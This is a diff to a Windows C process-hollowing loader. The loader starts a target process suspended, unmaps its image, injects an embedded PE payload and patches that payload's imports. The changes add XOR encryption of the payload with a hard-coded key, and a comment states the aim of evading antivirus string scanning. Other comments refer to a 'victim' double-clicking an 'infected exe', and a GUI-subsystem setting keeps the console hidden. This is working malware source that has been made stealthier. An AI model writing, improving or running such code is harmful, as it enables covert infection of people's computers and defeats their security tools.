@@ -34,6 +34,22 @@
 #include <stdlib.h>
 #include "payload.h"                 // extern unsigned char g_payload[]; extern unsigned g_payload_len;
 
+// XOR key for payload decryption (must match key in src/gen.ps1)
+static const unsigned char XOR_KEY[16] = {
+    0x43,0x4B,0x4C,0x47,0x21,0x3F,0x7A,0x9E,
+    0x55,0x2D,0x8C,0x01,0xF4,0x6B,0xD3,0x21
+};
+
+// Decrypt g_payload into a heap buffer. Returns pointer (caller frees with free()).
+// The embedded payload is XOR-encrypted to avoid AV string scanning.
+static unsigned char* DecryptPayload(void){
+    unsigned char* buf = (unsigned char*)malloc(g_payload_len);
+    if(!buf) return NULL;
+    for(unsigned i = 0; i < g_payload_len; i++)
+        buf[i] = g_payload[i] ^ XOR_KEY[i % 16];
+    return buf;
+}
+
 // GUI subsystem: no console window when the victim double-clicks the infected exe
 #pragma comment(linker, "/SUBSYSTEM:WINDOWS")
 #pragma comment(linker, "/ENTRY:wmainCRTStartup")
@@ -207,44 +223,48 @@ int wmain(int argc,wchar_t** argv){
     if(!CreateProcessW(target,NULL,NULL,NULL,FALSE,CREATE_SUSPENDED|CREATE_BREAKAWAY_FROM_JOB,NULL,NULL,&si,&pi)){
         return 3; }
 
-    // 3. Unmap the host's original code (NtUnmapViewOfSection)
-    PIMAGE_NT_HEADERS pn=Nt(g_payload);
+    // 3. Decrypt payload (XOR) — g_payload is encrypted, decrypt to heap buffer
+    unsigned char* payload = DecryptPayload();
+    if(!payload) { TerminateProcess(pi.hProcess,0); return 4; }
+
+    // 4. Unmap the host's original code (NtUnmapViewOfSection)
+    PIMAGE_NT_HEADERS pn=Nt(payload);
     HMODULE nt=GetModuleHandleA("ntdll.dll");
     tUnmap unmap=(tUnmap)GetProcAddress(nt,"NtUnmapViewOfSection");
     if(unmap) unmap(pi.hProcess,(PVOID)(ULONG_PTR)hn->OptionalHeader.ImageBase);
 
-    // 4. Map the payload at its fixed base (compiled /DYNAMICBASE:NO -> no relocation needed)
+    // 5. Map the payload at its fixed base (compiled /DYNAMICBASE:NO -> no relocation needed)
     SIZE_T sz=pn->OptionalHeader.SizeOfImage;
     PVOID base=VirtualAllocEx(pi.hProcess,(PVOID)(ULONG_PTR)pn->OptionalHeader.ImageBase,sz,
                               MEM_RESERVE|MEM_COMMIT,PAGE_READWRITE);
-    if(!base){ TerminateProcess(pi.hProcess,0); return 4; }
+    if(!base){ TerminateProcess(pi.hProcess,0); free(payload); return 4; }
     SIZE_T wr=0;
-    WriteProcessMemory(pi.hProcess,base,g_payload,pn->OptionalHeader.SizeOfHeaders,&wr);
+    WriteProcessMemory(pi.hProcess,base,payload,pn->OptionalHeader.SizeOfHeaders,&wr);
     PIMAGE_SECTION_HEADER sh=IMAGE_FIRST_SECTION(pn);
     for(WORD i=0;i<pn->FileHeader.NumberOfSections;i++,sh++){
         if(!sh->SizeOfRawData) continue;
         WriteProcessMemory(pi.hProcess,(BYTE*)base+sh->VirtualAddress,
-                           g_payload+sh->PointerToRawData,sh->SizeOfRawData,&wr);
+                           payload+sh->PointerToRawData,sh->SizeOfRawData,&wr);
     }
 
-    // 5. Fix IAT: only system DLLs, which have the SAME base in every process of this session
-    //    Read descriptors from g_payload (local buffer), not from base (target process memory)
+    // 6. Fix IAT: only system DLLs, which have the SAME base in every process of this session
+    //    Read descriptors from payload (local decrypted buffer), not from base (target process memory)
     DWORD imp_rva=pn->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
     if(imp_rva){
-        PIMAGE_IMPORT_DESCRIPTOR imp=(PIMAGE_IMPORT_DESCRIPTOR)(g_payload+Rva2Off(pn,imp_rva));
+        PIMAGE_IMPORT_DESCRIPTOR imp=(PIMAGE_IMPORT_DESCRIPTOR)(payload+Rva2Off(pn,imp_rva));
         while(imp->Name){
-            const char* dllname=(const char*)(g_payload+Rva2Off(pn,imp->Name));
+            const char* dllname=(const char*)(payload+Rva2Off(pn,imp->Name));
             HMODULE m=LoadLibraryA(dllname); if(!m) break;
             DWORD th_rva=imp->FirstThunk;
             DWORD o_rva=imp->OriginalFirstThunk?imp->OriginalFirstThunk:imp->FirstThunk;
-            PIMAGE_THUNK_DATA o_local=(PIMAGE_THUNK_DATA)(g_payload+Rva2Off(pn,o_rva));
+            PIMAGE_THUNK_DATA o_local=(PIMAGE_THUNK_DATA)(payload+Rva2Off(pn,o_rva));
             for(DWORD idx=0;o_local[idx].u1.AddressOfData;idx++){
                 FARPROC a;
                 if(IMAGE_SNAP_BY_ORDINAL(o_local[idx].u1.Ordinal))
                     a=GetProcAddress(m,(LPCSTR)IMAGE_ORDINAL(o_local[idx].u1.Ordinal));
                 else{
                     DWORD hint_rva=(DWORD)o_local[idx].u1.AddressOfData;
-                    PIMAGE_IMPORT_BY_NAME ib=(PIMAGE_IMPORT_BY_NAME)(g_payload+Rva2Off(pn,hint_rva));
+                    PIMAGE_IMPORT_BY_NAME ib=(PIMAGE_IMPORT_BY_NAME)(payload+Rva2Off(pn,hint_rva));
                     a=GetProcAddress(m,ib->Name);
                 }
                 ULONG_PTR v=(ULONG_PTR)a;
@@ -284,5 +304,6 @@ int wmain(int argc,wchar_t** argv){
     WaitForSingleObject(th,wait);
     if(kill) TerminateProcess(pi.hProcess,0);
     CloseHandle(th); CloseHandle(pi.hThread); CloseHandle(pi.hProcess);
+    free(payload);    // free decrypted payload buffer
     return 0;
 }
